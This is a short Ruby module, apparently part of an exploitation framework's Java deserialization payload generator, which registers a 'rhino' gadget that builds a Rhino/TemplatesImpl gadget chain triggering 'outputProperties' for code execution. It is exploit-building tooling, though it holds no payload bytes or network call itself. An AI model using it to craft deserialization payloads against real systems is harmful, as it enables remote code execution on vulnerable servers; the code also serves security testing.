# -*- coding: binary -*-
require_relative '../../payloads/rhino'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization 
class Rhino < S::Generator::Gadget
  def id
    'rhino'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('rhino')

    unless params.fetch('classfiles', nil).nil?
      return false unless S::Generator::Templates.supported(ctx,params)
    end

    true
  end

  def create(ctx, params: {})
    ctx.reg.load('model/rhino.json')

    if !params.fetch('classfiles', nil).nil?
      S::Generator::Rhino.make_get_property(
        S::Generator::Templates.make(ctx,params), 'outputProperties')
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  Rhino.new
)
